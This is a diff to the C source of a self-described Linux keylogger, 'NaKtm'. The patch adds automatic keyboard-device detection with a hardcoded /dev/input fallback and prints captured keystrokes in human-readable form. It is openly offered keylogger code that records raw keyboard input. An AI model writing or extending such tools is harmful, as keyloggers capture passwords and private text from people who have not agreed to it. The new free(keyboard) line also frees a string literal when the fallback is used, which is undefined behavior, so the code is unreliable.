@@ -19,7 +19,9 @@
 #include <string.h>
 #include <stdio.h>
 #include <unistd.h>
+
 #include "keymap.h"
+#include "keyboard-finder.h"
 
 int main() {
 
@@ -27,15 +29,20 @@ int main() {
     printf("NaKtm keylogger started.\n");
     fflush(stdout);
 
-    /* char* keyboard hardcoded for now. Future version would
-     * scan devices and choose the correct device.
+    /* How to find your keyboard device if find_keyboard_device
+     * is failing:
      *
      * Device info is available with the command
      * cat /proc/bus/input/devices
      * Look for the device event associated with the keyboard.
      * for example, I have two keyboards attached. One appears
      * as event3 and the other event 4. */
-    char* keyboard = "/dev/input/event3";
+	char* keyboard = find_keyboard_device();
+	if (keyboard == NULL) {
+		keyboard = "/dev/input/event3";
+		printf("Automatic keyboard device detection failed.\n");
+		printf("Reverting to manual keyboard device: %s\n", keyboard);	
+	}
 
     int fd = 0; /* file descriptor */
     int rd; /* number of bytes read */
@@ -52,7 +59,7 @@ int main() {
         while ( (rd = read(fd, &event, sizeof(struct input_event))) ) {
             fflush(stdout);
             if (event.type == EV_KEY)
-                log_keystroke(stdout, event);
+                log_keystroke_humanformat(stdout, event);
         }
 
     } else {
@@ -60,5 +67,6 @@ int main() {
         exit(1);
     }
 
+	free(keyboard);
     return 0;
 }
